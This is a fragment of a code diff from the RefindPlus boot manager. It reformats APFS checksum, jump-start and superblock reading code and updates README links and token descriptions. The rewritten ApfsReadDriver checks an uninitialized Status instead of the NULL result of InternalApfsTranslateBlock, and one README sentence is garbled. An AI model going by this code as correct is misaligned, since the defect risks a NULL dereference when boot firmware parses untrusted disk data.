(!EFI_ERROR(Status)) {\n-                REFIT_CALL_1_WRAPPER(mRootDir->Close, mRootDir);\n+                REFIT_CALL_1_WRAPPER(\n+                    mRootDir->Close, mRootDir\n+                );\n                 DelMsgLog = TRUE;\n             }\n         }\n```\n\nFilename: Library/RP_ApfsLib/RP_ApfsIo.c:\n```\n@@ -1,7 +1,7 @@\n/** @file\n Copyright (C) 2020, vit9696. All rights reserved.\n \n-Modified 2021, Dayo Akanji. (sf.net/u/dakanji/profile)\n+Modified 2021 - 2025, Dayo Akanji. (sf.net/u/dakanji/profile)\n \n   All rights reserved.\n\n@@ -27,340 +27,356 @@\nModified 2021, Dayo Akanji. (sf.net/u/dakanji/profile)\n \n static\n UINT64 ApfsFletcher64 (\n-  VOID    *Data,\n-  UINTN    DataSize\n-  )\n-{\n-  UINT32        *Walker;\n-  UINT32        *WalkerEnd;\n-  UINT64         Sum1;\n-  UINT64         Sum2;\n-  UINT32         Rem;\n-\n-  // For APFS we have the following guarantees (checked outside).\n-  // - DataSize is always divisible by 4 (UINT32), the only potential exceptions\n-  //   are multiples of block sizes of 1 and 2, which we do not support and filter out.\n-  // - DataSize is always between 0x1000-8 and 0x10000-8, i.e. within UINT16.\n-  ASSERT (DataSize >= APFS_NX_MINIMUM_BLOCK_SIZE - sizeof (UINT64));\n-  ASSERT (DataSize <= APFS_NX_MAXIMUM_BLOCK_SIZE - sizeof (UINT64));\n-  ASSERT (DataSize % sizeof (UINT32) == 0);\n-\n-  Sum1 = 0;\n-  Sum2 = 0;\n-\n-  Walker     = Data;\n-  WalkerEnd  = Walker + DataSize / sizeof (UINT32);\n-\n-  // Do usual Fletcher-64 rounds without modulo due to impossible overflow.\n-  while (Walker < WalkerEnd) {\n-    // Sum1 never overflows, because 0xFFFFFFFF * (0x10000-8) < MAX_UINT64.\n-    // This is just a normal sum of data values.\n-    Sum1 += *Walker;\n-\n-    // Sum2 never overflows, because 0xFFFFFFFF * (0x4000-1) * 0x1FFF < MAX_UINT64.\n-    // This is just a normal arithmetical progression of sums.\n-    Sum2 += Sum1;\n-    ++Walker;\n-  }\n+    VOID    *Data,\n+    UINTN    DataSize\n+) {\n+    UINT32        *Walker;\n+    UINT32        *WalkerEnd;\n+    UINT64         Sum1;\n+    UINT64         Sum2;\n+    UINT32         Rem;\n+\n+    // For APFS we have the following guarantees (checked outside).\n+    // - DataSize is always divisible by 4 (UINT32), the only potential exceptions\n+    //   are multiples of block sizes of 1 and 2, which we do not support and filter out.\n+    // - DataSize is always between 0x1000-8 and 0x10000-8, i.e. within UINT16.\n+    ASSERT (DataSize >= APFS_NX_MINIMUM_BLOCK_SIZE - sizeof (UINT64));\n+    ASSERT (DataSize <= APFS_NX_MAXIMUM_BLOCK_SIZE - sizeof (UINT64));\n+    ASSERT (DataSize % sizeof (UINT32) == 0);\n+\n+    Sum1 = 0;\n+    Sum2 = 0;\n+\n+    Walker     = Data;\n+    WalkerEnd  = Walker + DataSize / sizeof (UINT32);\n+\n+    // Do usual Fletcher-64 rounds without modulo due to impossible overflow.\n+    while (Walker < WalkerEnd) {\n+        // Sum1 never overflows, because 0xFFFFFFFF * (0x10000-8) < MAX_UINT64.\n+        // This is just a normal sum of data values.\n+        Sum1 += *Walker;\n+\n+        // Sum2 never overflows, because 0xFFFFFFFF * (0x4000-1) * 0x1FFF < MAX_UINT64.\n+        // This is just a normal arithmetical progression of sums.\n+        Sum2 += Sum1;\n+        ++Walker;\n+    }\n \n-  // Split Fletcher-64 halves.\n-  // As per Chinese remainder theorem, perform the modulo now.\n-  // No overflows also possible as seen from Sum1/Sum2 upper bounds above.\n-  Sum2 += Sum1;\n-  APFS_MOD_MAX_UINT32 (Sum2, &Rem);\n-  Sum2  = ~Rem;\n+    // Split Fletcher-64 halves.\n+    // As per Chinese remainder theorem, perform the modulo now.\n+    // No overflows also possible as seen from Sum1/Sum2 upper bounds above.\n+    Sum2 += Sum1;\n+    APFS_MOD_MAX_UINT32 (Sum2, &Rem);\n+    Sum2  = ~Rem;\n \n-  Sum1 += Sum2;\n-  APFS_MOD_MAX_UINT32 (Sum1, &Rem);\n-  Sum1  = ~Rem;\n+    Sum1 += Sum2;\n+    APFS_MOD_MAX_UINT32 (Sum1, &Rem);\n+    Sum1  = ~Rem;\n \n-  return (Sum1 << 32U) | Sum2;\n+    return (Sum1 << 32U) | Sum2;\n }\n \n static\n BOOLEAN ApfsBlockChecksumVerify (\n-  APFS_OBJ_PHYS   *Block,\n-  UINTN            DataSize\n-  )\n-{\n-  UINT64  NewChecksum;\n+    APFS_OBJ_PHYS   *Block,\n+    UINTN            DataSize\n+) {\n+    UINT64  NewChecksum;\n \n-  ASSERT (DataSize > sizeof (*Block));\n+    ASSERT (DataSize > sizeof (*Block));\n \n-  NewChecksum = ApfsFletcher64 (\n-    &Block->ObjectOid,\n-    DataSize - sizeof (Block->Checksum)\n+    NewChecksum = ApfsFletcher64 (\n+        &Block->ObjectOid,\n+        DataSize - sizeof (Block->Checksum)\n     );\n \n-  if (NewChecksum == Block->Checksum) {\n-    return TRUE;\n-  }\n+    if (NewChecksum == Block->Checksum) {\n+        return TRUE;\n+    }\n \n-  return FALSE;\n+    return FALSE;\n }\n \n static\n EFI_STATUS ApfsReadJumpStart (\n-  IN  APFS_PRIVATE_DATA      *PrivateData,\n-  OUT APFS_NX_EFI_JUMPSTART  **JumpStartPtr\n-  )\n-{\n-  EFI_STATUS              Status;\n-  APFS_NX_EFI_JUMPSTART  *JumpStart;\n-  EFI_BLOCK_IO_PROTOCOL  *BlockIo;\n-  EFI_LBA                 Lba;\n-  UINT32                  MaxExtents;\n-\n-  // No jump start driver, ignore.\n-  if (PrivateData->EfiJumpStart == 0) {\n-      return EFI_UNSUPPORTED;\n-  }\n-\n-  // Allocate memory for jump start.\n-  JumpStart = AllocateZeroPool (PrivateData->ApfsBlockSize);\n-  if (JumpStart == NULL) {\n-      return EFI_OUT_OF_RESOURCES;\n-  }\n-\n-  BlockIo = InternalApfsTranslateBlock (PrivateData, PrivateData->EfiJumpStart, &Lba);\n-  if (BlockIo == NULL) {\n-      return EFI_UNSUPPORTED;\n-  }\n-\n-  // Read jump start and abort on failure.\n-  Status = REFIT_CALL_5_WRAPPER(\n-      BlockIo->ReadBlocks, BlockIo,\n-      BlockIo->Media->MediaId, Lba,\n-      PrivateData->ApfsBlockSize, JumpStart\n-  );\n-\n-  if (EFI_ERROR(Status)) {\n-      FreePool (JumpStart);\n-      return Status;\n-  }\n-\n-  // Jump start is expected to have JSDR magic.\n-  // Version is not checked by ApfsJumpStart driver.\n-  if (JumpStart->Magic != APFS_NX_EFI_JUMPSTART_MAGIC) {\n-    FreePool (JumpStart);\n-    return EFI_UNSUPPORTED;\n-  }\n-\n-  // Calculate and verify checksum.\n-  if (!ApfsBlockChecksumVerify (&JumpStart->BlockHeader, PrivateData->ApfsBlockSize)) {\n-    FreePool (JumpStart);\n-    return EFI_UNSUPPORTED;\n-  }\n-\n-  // Ensure that extent count does not overflow.\n-  MaxExtents = (PrivateData->ApfsBlockSize - sizeof (*JumpStart)) / sizeof (JumpStart->RecordExtents[0]);\n-  if (MaxExtents < JumpStart->NumExtents) {\n-    FreePool (JumpStart);\n-    return EFI_UNSUPPORTED;\n-  }\n+    IN  APFS_PRIVATE_DATA      *PrivateData,\n+    OUT APFS_NX_EFI_JUMPSTART  **JumpStartPtr\n+) {\n+    EFI_STATUS              Status;\n+    APFS_NX_EFI_JUMPSTART  *JumpStart;\n+    EFI_BLOCK_IO_PROTOCOL  *BlockIo;\n+    EFI_LBA                 Lba;\n+    UINT32                  MaxExtents;\n+    BOOLEAN                 Verified;\n+\n+    // No jump start driver, ignore.\n+    if (PrivateData->EfiJumpStart == 0) {\n+        return EFI_UNSUPPORTED;\n+    }\n \n-  *JumpStartPtr = JumpStart;\n-  return EFI_SUCCESS;\n-}\n+    // Allocate memory for jump start.\n+    JumpStart = AllocateZeroPool (PrivateData->ApfsBlockSize);\n+    if (JumpStart == NULL) {\n+        return EFI_OUT_OF_RESOURCES;\n+    }\n \n-static\n-EFI_STATUS ApfsReadDriver (\n-  IN  APFS_PRIVATE_DATA       *PrivateData,\n-  IN  APFS_NX_EFI_JUMPSTART   *JumpStart,\n-  OUT UINTN                   *DriverSize,\n-  OUT VOID                   **DriverBuffer\n-  )\n-{\n-  EFI_STATUS              Status;\n-  VOID                   *EfiFile;\n-  UINTN                   EfiFileSize;\n-  UINTN                   OrgEfiFileSize;\n-  UINT8                  *ChunkPtr;\n-  UINTN                   ChunkSize;\n-  UINTN                   Index;\n-  EFI_BLOCK_IO_PROTOCOL  *BlockIo;\n-  EFI_LBA                 Lba;\n-\n-  EfiFileSize = JumpStart->EfiFileLen / PrivateData->ApfsBlockSize + 1;\n-  if (OcOverflowMulUN (EfiFileSize, PrivateData->ApfsBlockSize, &EfiFileSize)) {\n-    return EFI_SECURITY_VIOLATION;\n-  }\n-\n-  OrgEfiFileSize = EfiFileSize;\n-\n-  EfiFile = AllocateZeroPool (EfiFileSize);\n-  if (EfiFile == NULL) {\n-    return EFI_OUT_OF_RESOURCES;\n-  }\n-\n-  ChunkPtr = EfiFile;\n-\n-  for (Index = 0; Index < JumpStart->NumExtents || EfiFileSize != 0; ++Index) {\n     BlockIo = InternalApfsTranslateBlock (\n-      PrivateData,\n-      JumpStart->RecordExtents[Index].StartPhysicalAddr,\n-      &Lba\n-      );\n-\n-    if (JumpStart->RecordExtents[Index].BlockCount > MAX_UINTN\n-      || OcOverflowMulUN ((UINTN) JumpStart->RecordExtents[Index].BlockCount, PrivateData->ApfsBlockSize, &ChunkSize)\n-      || ChunkSize > EfiFileSize) {\n-      FreePool (EfiFile);\n-      return EFI_SECURITY_VIOLATION;\n+        PrivateData,\n+        PrivateData->EfiJumpStart, &Lba\n+    );\n+    if (BlockIo == NULL) {\n+        FreePool (JumpStart);\n+        return EFI_UNSUPPORTED;\n     }\n \n-    Status = BlockIo->ReadBlocks (\n-      BlockIo,\n-      BlockIo->Media->MediaId,\n-      Lba,\n-      ChunkSize,\n-      ChunkPtr\n-      );\n-\n+    // Read jump start and abort on failure.\n+    Status = REFIT_CALL_5_WRAPPER(\n+        BlockIo->ReadBlocks, BlockIo,\n+        BlockIo->Media->MediaId, Lba,\n+        PrivateData->ApfsBlockSize, JumpStart\n+    );\n     if (EFI_ERROR(Status)) {\n-      FreePool (EfiFile);\n-      return Status;\n+        FreePool (JumpStart);\n+        return Status;\n     }\n \n-    ChunkPtr    += ChunkSize;\n-    EfiFileSize -= ChunkSize;\n-  }\n+    // Jump start is expected to have JSDR magic.\n+    // Version is not checked by ApfsJumpStart driver.\n+    if (JumpStart->Magic != APFS_NX_EFI_JUMPSTART_MAGIC) {\n+        FreePool (JumpStart);\n+        return EFI_UNSUPPORTED;\n+    }\n \n-  // Ensure that we do not have meaningful trailing memory just in case.\n-  if (OrgEfiFileSize != JumpStart->EfiFileLen) {\n-    ChunkPtr  = EfiFile;\n-    ChunkPtr += JumpStart->EfiFileLen;\n-    ZeroMem (ChunkPtr, OrgEfiFileSize - JumpStart->EfiFileLen);\n-  }\n+    // Calculate and verify checksum.\n+    Verified = ApfsBlockChecksumVerify (\n+        &JumpStart->BlockHeader,\n+        PrivateData->ApfsBlockSize\n+    );\n+    if (!Verified) {\n+        FreePool (JumpStart);\n+        return EFI_UNSUPPORTED;\n+    }\n \n-  *DriverSize   = JumpStart->EfiFileLen;\n-  *DriverBuffer = EfiFile;\n+    // Ensure that extent count does not overflow.\n+    MaxExtents = (\n+        PrivateData->ApfsBlockSize - sizeof (*JumpStart)\n+    ) / sizeof (JumpStart->RecordExtents[0]);\n+    if (MaxExtents < JumpStart->NumExtents) {\n+        FreePool (JumpStart);\n+        return EFI_UNSUPPORTED;\n+    }\n \n-  return EFI_SUCCESS;\n+    *JumpStartPtr = JumpStart;\n+    return EFI_SUCCESS;\n }\n \n-EFI_STATUS InternalApfsReadSuperBlock (\n-  IN  EFI_BLOCK_IO_PROTOCOL   *BlockIo,\n-  OUT APFS_NX_SUPERBLOCK     **SuperBlockPtr\n-  )\n-{\n-  EFI_STATUS            Status;\n-  APFS_NX_SUPERBLOCK   *SuperBlock;\n-  UINTN                 ReadSize;\n-  UINTN                 Retry;\n-\n-  // According to APFS specs, APFS block size is a multiple of disk block size.\n-  // Start by reading APFS_NX_MINIMUM_BLOCK_SIZE aligned to block size.\n-  ReadSize = ALIGN_VALUE (APFS_NX_MINIMUM_BLOCK_SIZE, BlockIo->Media->BlockSize);\n-\n-  SuperBlock = NULL;\n-\n-  // Second attempt is given for cases when block size is bigger than our guessed size.\n-  for (Retry = 0; Retry < 2; ++Retry) {\n-    // Allocate memory for super block.\n-    SuperBlock = AllocateZeroPool (ReadSize);\n-    if (SuperBlock == NULL) {\n-      break;\n-    }\n-\n-    // Read super block and abort on failure.\n-    Status = REFIT_CALL_5_WRAPPER(\n-        BlockIo->ReadBlocks, BlockIo,\n-        BlockIo->Media->MediaId, 0,\n-        ReadSize, SuperBlock\n+static\n+EFI_STATUS ApfsReadDriver (\n+    IN  APFS_PRIVATE_DATA       *PrivateData,\n+    IN  APFS_NX_EFI_JUMPSTART   *JumpStart,\n+    OUT UINTN                   *DriverSize,\n+    OUT VOID                   **DriverBuffer\n+) {\n+    EFI_STATUS              Status;\n+    VOID                   *EfiFile;\n+    UINTN                   EfiFileSize;\n+    UINTN                   OrgEfiFileSize;\n+    UINT8                  *ChunkPtr;\n+    UINTN                   ChunkSize;\n+    UINTN                   Index;\n+    BOOLEAN                 Overflow;\n+    EFI_BLOCK_IO_PROTOCOL  *BlockIo;\n+    EFI_LBA                 Lba;\n+\n+    EfiFileSize = JumpStart->EfiFileLen / PrivateData->ApfsBlockSize + 1;\n+    Overflow = OcOverflowMulUN (\n+        EfiFileSize, PrivateData->ApfsBlockSize, &EfiFileSize\n     );\n-    if (EFI_ERROR(Status)) {\n-      break;\n+    if (Overflow) {\n+        return EFI_SECURITY_VIOLATION;\n     }\n \n-    // Super block is expected to have NXSB magic.\n-    if (SuperBlock->Magic != APFS_NX_SIGNATURE) {\n-      break;\n-    }\n+    OrgEfiFileSize = EfiFileSize;\n \n-    // Ensure APFS block size is:\n-    // - A multiple of disk block size.\n-    // - Divisible by UINT32 for fletcher checksum to work (e.g. when block size is 1 or 2).\n-    // - Within minimum and maximum edges.\n-    if (SuperBlock->BlockSize < BlockIo->Media->BlockSize    ||\n-        SuperBlock->BlockSize < APFS_NX_MINIMUM_BLOCK_SIZE   ||\n-        SuperBlock->BlockSize > APFS_NX_MAXIMUM_BLOCK_SIZE   ||\n-        (SuperBlock->BlockSize & (sizeof (UINT32) - 1)) != 0 ||\n-        (SuperBlock->BlockSize & (BlockIo->Media->BlockSize - 1)) != 0\n-    ) {\n-      break;\n+    EfiFile = AllocateZeroPool (EfiFileSize);\n+    if (EfiFile == NULL) {\n+        return EFI_OUT_OF_RESOURCES;\n     }\n \n-    // Check if we can calculate the checksum and try again on failure.\n-    if (SuperBlock->BlockSize > ReadSize) {\n-      ReadSize = SuperBlock->BlockSize;\n-      FreePool (SuperBlock);\n-      SuperBlock = NULL;\n-      continue;\n+    ChunkPtr = EfiFile;\n+\n+    for (Index = 0; Index < JumpStart->NumExtents || EfiFileSize != 0; ++Index) {\n+        BlockIo = InternalApfsTranslateBlock (\n+            PrivateData,\n+            JumpStart->RecordExtents[Index].StartPhysicalAddr,\n+            &Lba\n+        );\n+        if (EFI_ERROR(Status)) {\n+            Status = EFI_SECURITY_VIOLATION;\n+            break;\n+        }\n+\n+        Overflow = OcOverflowMulUN (\n+            (UINTN) JumpStart->RecordExtents[Index].BlockCount,\n+            PrivateData->ApfsBlockSize,\n+            &ChunkSize\n+        );\n+        if (Overflow ||\n+            ChunkSize > EfiFileSize ||\n+            JumpStart->RecordExtents[Index].BlockCount > MAX_UINTN\n+        ) {\n+            Status = EFI_SECURITY_VIOLATION;\n+            break;\n+        }\n+\n+        Status = BlockIo->ReadBlocks (\n+            BlockIo,\n+            BlockIo->Media->MediaId,\n+            Lba,\n+            ChunkSize,\n+            ChunkPtr\n+        );\n+        if (EFI_ERROR(Status)) {\n+            break;\n+        }\n+\n+        ChunkPtr    += ChunkSize;\n+        EfiFileSize -= ChunkSize;\n     }\n \n-    // Calculate and verify checksum.\n-    if (!ApfsBlockChecksumVerify (\n-        &SuperBlock->BlockHeader,\n-        SuperBlock->BlockSize)\n-    ) {\n-      break;\n+    if (EFI_ERROR(Status)) {\n+        FreePool (EfiFile);\n+        return Status;\n     }\n \n-    // Verify object type and flags.\n-    // SubType being 0 comes from ApfsJumpStart and is not documented.\n-    // ObjectOid being 1 comes from ApfsJumpStart and is not documented.\n-    if (SuperBlock->BlockHeader.ObjectSubType != 0 ||\n-        SuperBlock->BlockHeader.ObjectOid     != 1 ||\n-        SuperBlock->BlockHeader.ObjectType    != (\n-            APFS_OBJ_EPHEMERAL | APFS_OBJECT_TYPE_NX_SUPERBLOCK\n-        )\n-  ) {\n-      break;\n+    // Ensure that we do not have meaningful trailing memory just in case.\n+    if (OrgEfiFileSize != JumpStart->EfiFileLen) {\n+        ChunkPtr  = EfiFile;\n+        ChunkPtr += JumpStart->EfiFileLen;\n+        ZeroMem (ChunkPtr, OrgEfiFileSize - JumpStart->EfiFileLen);\n     }\n \n-    // Super block is assumed to be legit.\n-    *SuperBlockPtr = SuperBlock;\n+    *DriverSize   = JumpStart->EfiFileLen;\n+    *DriverBuffer = EfiFile;\n+\n     return EFI_SUCCESS;\n-  }\n+}\n+\n+EFI_STATUS InternalApfsReadSuperBlock (\n+    IN  EFI_BLOCK_IO_PROTOCOL   *BlockIo,\n+    OUT APFS_NX_SUPERBLOCK     **SuperBlockPtr\n+) {\n+    EFI_STATUS            Status;\n+    APFS_NX_SUPERBLOCK   *SuperBlock;\n+    UINTN                 ReadSize;\n+    UINTN                 Retry;\n+    BOOLEAN               Verified;\n+\n+    // According to APFS specs, APFS block size is a multiple of disk block size.\n+    // Start by reading APFS_NX_MINIMUM_BLOCK_SIZE aligned to block size.\n+    ReadSize = ALIGN_VALUE (APFS_NX_MINIMUM_BLOCK_SIZE, BlockIo->Media->BlockSize);\n+\n+    SuperBlock = NULL;\n+\n+    // Second attempt is given for cases when block size is bigger than our guessed size.\n+    for (Retry = 0; Retry < 2; ++Retry) {\n+        // Allocate memory for super block.\n+        SuperBlock = AllocateZeroPool (ReadSize);\n+        if (SuperBlock == NULL) {\n+            break;\n+        }\n+\n+        // Read super block and abort on failure.\n+        Status = REFIT_CALL_5_WRAPPER(\n+            BlockIo->ReadBlocks, BlockIo,\n+            BlockIo->Media->MediaId, 0,\n+            ReadSize, SuperBlock\n+        );\n+        if (EFI_ERROR(Status)) {\n+            break;\n+        }\n+\n+        // Super block is expected to have NXSB magic.\n+        if (SuperBlock->Magic != APFS_NX_SIGNATURE) {\n+            break;\n+        }\n+\n+        // Ensure APFS block size is:\n+        // - A multiple of disk block size.\n+        // - Divisible by UINT32 for fletcher checksum to work\n+        //   (e.g. when block size is 1 or 2).\n+        // - Within minimum and maximum edges.\n+        if (SuperBlock->BlockSize < BlockIo->Media->BlockSize    ||\n+            SuperBlock->BlockSize < APFS_NX_MINIMUM_BLOCK_SIZE   ||\n+            SuperBlock->BlockSize > APFS_NX_MAXIMUM_BLOCK_SIZE   ||\n+            (SuperBlock->BlockSize & (sizeof (UINT32) - 1)) != 0 ||\n+            (SuperBlock->BlockSize & (BlockIo->Media->BlockSize - 1)) != 0\n+        ) {\n+            break;\n+        }\n+\n+        // Check if we can calculate the checksum and try again on failure.\n+        if (SuperBlock->BlockSize > ReadSize) {\n+            ReadSize = SuperBlock->BlockSize;\n+            FreePool (SuperBlock);\n+            SuperBlock = NULL;\n+            continue;\n+        }\n+\n+        // Calculate and verify checksum.\n+        Verified = ApfsBlockChecksumVerify (\n+            &SuperBlock->BlockHeader,\n+            SuperBlock->BlockSize\n+        );\n+        if (!Verified) break;\n+\n+        // Verify object type and flags.\n+        // SubType being 0 comes from ApfsJumpStart and is not documented.\n+        // ObjectOid being 1 comes from ApfsJumpStart and is not documented.\n+        if (SuperBlock->BlockHeader.ObjectSubType != 0 ||\n+            SuperBlock->BlockHeader.ObjectOid     != 1 ||\n+            SuperBlock->BlockHeader.ObjectType    != (\n+                APFS_OBJ_EPHEMERAL | APFS_OBJECT_TYPE_NX_SUPERBLOCK\n+            )\n+        ) {\n+            break;\n+        }\n+\n+        // Super block is assumed to be legit.\n+        *SuperBlockPtr = SuperBlock;\n+\n+        return EFI_SUCCESS;\n+    }\n \n-  // All retry attempts exceeded.\n-  if (SuperBlock != NULL) {\n-    FreePool (SuperBlock);\n-  }\n+    // All retry attempts exceeded.\n+    if (SuperBlock != NULL) {\n+        FreePool (SuperBlock);\n+    }\n \n-  return EFI_UNSUPPORTED;\n+    return EFI_UNSUPPORTED;\n }\n \n EFI_STATUS InternalApfsReadDriver (\n-  IN  APFS_PRIVATE_DATA    *PrivateData,\n-  OUT UINTN                *DriverSize,\n-  OUT VOID                **DriverBuffer\n-  )\n-{\n-  EFI_STATUS              Status;\n-  APFS_NX_EFI_JUMPSTART  *JumpStart;\n-\n-  Status = ApfsReadJumpStart (\n-    PrivateData,\n-    &JumpStart\n+    IN  APFS_PRIVATE_DATA    *PrivateData,\n+    OUT UINTN                *DriverSize,\n+    OUT VOID                **DriverBuffer\n+) {\n+    EFI_STATUS              Status;\n+    APFS_NX_EFI_JUMPSTART  *JumpStart;\n+\n+    Status = ApfsReadJumpStart (\n+        PrivateData, &JumpStart\n     );\n-  if (EFI_ERROR(Status)) {\n-    return Status;\n-  }\n+    if (EFI_ERROR(Status)) {\n+        return Status;\n+    }\n \n-  Status = ApfsReadDriver (\n-    PrivateData,\n-    JumpStart,\n-    DriverSize,\n-    DriverBuffer\n+    Status = ApfsReadDriver (\n+        PrivateData, JumpStart,\n+        DriverSize, DriverBuffer\n     );\n \n-  FreePool (JumpStart);\n+    FreePool (JumpStart);\n \n-  if (EFI_ERROR(Status)) {\n     return Status;\n-  }\n-\n-  return EFI_SUCCESS;\n }\n```\n\nFilename: README-Dev.md:\n```\n@@ -6,11 +6,11 @@\nA Boot Manager for Mac and PC\n \n <br>\n \n-[![Release Version](https://img.shields.io/github/v/release/dakanji/RefindPlus?style=for-the-badge&color=informational&label=current)](https://github.com/dakanji/RefindPlus/releases)[![Release Date](https://img.shields.io/github/release-date/dakanji/RefindPlus.svg?display_date=published_at&style=for-the-badge&color=informational&label=)](https://github.com/dakanji/RefindPlus/releases)\n+[![Release Version](https://img.shields.io/github/v/release/dakanji/RefindPlus?style=for-the-badge&color=informational&label=current)](https://github.com/RefindPlusRepos/RefindPlus/releases)[![Release Date](https://img.shields.io/github/release-date/dakanji/RefindPlus.svg?display_date=published_at&style=for-the-badge&color=informational&label=)](https://github.com/RefindPlusRepos/RefindPlus/releases)\n \n [![Coverity Scan](https://img.shields.io/coverity/scan/22695)](https://scan.coverity.com/projects/22695)&nbsp;&nbsp;&nbsp;[![Codacy Grade](https://img.shields.io/codacy/grade/d2955171e96246579279c1a28c4b11cf?label=codacy)](https://app.codacy.com/gh/dakanji/RefindPlus/dashboard)\n \n-[![License Type](https://img.shields.io/badge/GPL%203.0/Later-blue?label=copies)](https://github.com/dakanji/RefindPlus/blob/GOPFix/INFO.txt)\n+[![License Type](https://img.shields.io/badge/GPL%203.0/Later-blue?label=copies)](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/INFO.txt)\n \n </div>\n\n@@ -54,7 +54,7 @@\nSome features:\n \n ## Installation\n \n-[MyBootMgr](https://www.dakanji.com/creations/index.html) is recommended to automate installing RefindPlus when running Mac OS on Intel-based Macs. Alternatively, as the RefindPlus efi file can function as a drop-in replacement for the upstream efi file, the [rEFInd package](https://www.rodsbooks.com/refind/installing.html) can be installed first and its efi file replaced with the RefindPlus efi file (Rename RefindPlus file to match). This allows installing RefindPlus on other compatible operating systems supported upstream. See `UEFI Secure Boot` under the [Divergence Section](https://github.com/dakanji/RefindPlus#divergence) for how to enable this if required.\n+[MyBootMgr](https://www.dakanji.com/creations/index.html) is recommended to automate installing RefindPlus when running Mac OS on Intel-based Macs. Alternatively, as the RefindPlus efi file can function as a drop-in replacement for the upstream efi file, the [rEFInd package](https://www.rodsbooks.com/refind/installing.html) can be installed first and its efi file replaced with the RefindPlus efi file (Rename RefindPlus file to match). This allows installing RefindPlus on other compatible operating systems supported upstream. See `UEFI Secure Boot` under the [Divergence Section](https://github.com/RefindPlusRepos/RefindPlus#divergence) for how to enable this if required.\n \n > [!NOTE]\n >\n\n@@ -66,7 +66,7 @@\nUpstream post-release code updates are typically ported to RefindPlus as they ha\n >\n > Consider replacing upstream filesystem drivers with those packaged with RefindPlus as these are always either exactly the same as upstream versions or have had fixes applied.\n \n-RefindPlus will function with the upstream configuration file, `refind.conf`, but users may wish to replace this with the RefindPlus configuration file, `config.conf`, to configure the additional options provided by RefindPlus. A sample RefindPlus configuration file is available here: [config.conf-sample-Dev](https://github.com/dakanji/RefindPlus/blob/GOPFix/config.conf-sample-Dev).\n+RefindPlus will function with the upstream configuration file, `refind.conf`, but users may wish to replace this with the RefindPlus configuration file, `config.conf`, to configure the additional options provided by RefindPlus. A sample RefindPlus configuration file is available here: [config.conf-sample-Dev](https://github.com/RefindPlusRepos/RefindPlus/blob/GOPFix/config.conf-sample-Dev).\n \n > [!TIP]\n >\n\n@@ -76,18 +76,18 @@\nWhen run without activating RefindPlus-specific configuration options, as will b\n \n > [!NOTE]\n >\n-> This equivalence is subject to some differences such as outlined under the [Divergence Section](https://github.com/dakanji/RefindPlus#divergence) below.\n+> This equivalence is subject to some differences such as outlined under the [Divergence Section](https://github.com/RefindPlusRepos/RefindPlus#divergence) below.\n \n ## Additional Functionality\n \n-RefindPlus-specific funtionality can be configured using the tokens below.<br>\n-Additional information is provided in the sample RefindPlus configuration file.<br>\n+RefindPlus-specific funtionality can be configured using the tokens below.\\\n+Additional information is provided in the sample RefindPlus configuration file.\\\n These tokens are included in `Section 1` of the sample RefindPlus configuration file.\n \n Token | Functionality\n ----- | -----\n continue_on_warning   |Proceed as if a key was pressed after screen warnings (for unattended boot)\n-csr_dynamic           |Actively enables or disables Apple's `System Integrity Protection` (SIP)\n+csr_dynamic           |Actively sets or unsets Apple's `Configurable Security Restrictions (CSR)`\n csr_normalise         |Removes the `APPLE_INTERNAL` bit, when present, to permit OTA updates\n decline_help_icon     |Disables feature that may improve loading speed by preferring generic icons\n decline_help_size     |Disables feature that sets additional UI scaling for very high DPI screens\n\n@@ -149,11 +149,12 @@\nIn addition to the new functionality listed above, the following upstream tokens\n   - This is equivalent to activating the `csr_normalise` token.\n - **\"log_level\":** Controls the native log format and an implementation of the upstream format.\n   - Levels 0, 1, or 2 can be specified.\n-    - Level 0 activates the native succinct log format.\n-    - Level 1 is broadly equivalent to the verbose upstream Level 4 format (Upstream Levels 1 to 3 were dispensed with)\n+    - Level 0 activates the succinct native log format.\n+    - Level 1 is broadly equivalent to the verbose upstream Level 4 format\n+      - Upstream Levels 1 to 3 were dispensed with\n     - Level 2 is only exposed on `NOOPT` builds and outputs logs at a very detailed level\n       - The RefindPlus build script will create `NOOPT` builds when passed `ALL` or `NPT` as a second parameter\n-        - Setting `ALL` includes an `NPT` build to the standard `REL` and `DBG` builds created\n+        - Setting `ALL` adds an `NPT` build to the standard `REL` and `DBG` builds created\n         - Setting `NPT` creates only that build type\n           - Applies to setting `REL` or `DBG`\n       - The first parameter is the build branch, which also needs to be specified in such instances\n\n@@ -169,14 +170,14 @@\nIn addition to the new functionality listed above, the following upstream tokens\n Significant visible implementation differences vis-a-vis the upstream base are:\n - **UEFI Secure Boot:** RefindPlus binaries are currently not signed for secure boot support and do not include the `Secure Boot Advanced Targeting (SBAT)` sections required by Shim v15.3/newer.\n   - > The process [outlined here](https://www.rodsbooks.com/refind/secureboot.html#installation) for signing self built upstream binaries can be followed to enable suport.\n-  - > An adaptation of the process for RefindPlus is [provided here](https://github.com/dakanji/RefindPlus/discussions/190#discussioncomment-10130431). Modify for newer releases as required.\n+  - > An adaptation of the process for RefindPlus is [provided here](https://github.com/RefindPlusRepos/RefindPlus/discussions/190#discussioncomment-10130431). Modify for newer releases as required.\n   - > Refer to [this summation](https://forum.manjaro.org/t/howto-enable-secure-boot-with-refind/121403/6) for futher insight.\n - **GZipped Loaders:** RefindPlus only provides stub support for handling GZipped loaders as this is largely only relevant for units on the ARM architecture.\n   - > This stub support is only used for debug logging in RefindPlus and can be activated using the same `support_gzipped_loaders` configuration token as upstream.\n - **Screenshots:** These are saved in the PNG format with a significantly smaller file size.\n-  - > Additionally, the file naming is different and the files are always saved to the same ESP as the RefindPlus efi file.\n+  - > Additionally, the file naming is different and files are always saved to the same ESP RefindPlus.\n - **UI Flags:** RefindPlus requires that any desired previously set `hideui` configuration token options are explicitly defined in supplementary/theme configuration files; as whenever the token is found in such files, the token setting is reset by RefindPlus to the specified option(s). The upstream implementation effectively adds new settings to any previously existing ones for this configuration token instead.\n-  - > The RefindPlus implementation maintains consistency with how other configuration tokens are handled.\n+  - > RefindPlus maintains consistency with how other configuration tokens are handled.\n - **UI Scaling:** WQHD monitors are correctly determined not to be HiDPI monitors and UI elements are not scaled up on such monitors when the RefindPlus-specific `scale_ui` configuration token is set to automatically detect the screen resolution. RefindPlus also takes vertically orientated screens into account and additionally scales UI elements down when low resolution screens (less than 1025px on the longest edge) are detected.\n   - > Additionally, UI elements on extremely high resultion screens (greater than 5999px on the longest edge) receive a `4X scaling` as opposed to the `2X scaling` applied for standard HiDPI screens.\n - **Loader Icons:** RefindPlus prefers `os_windows` and `boot_windows` icon files, if present, over `os_win` and `boot_win` and 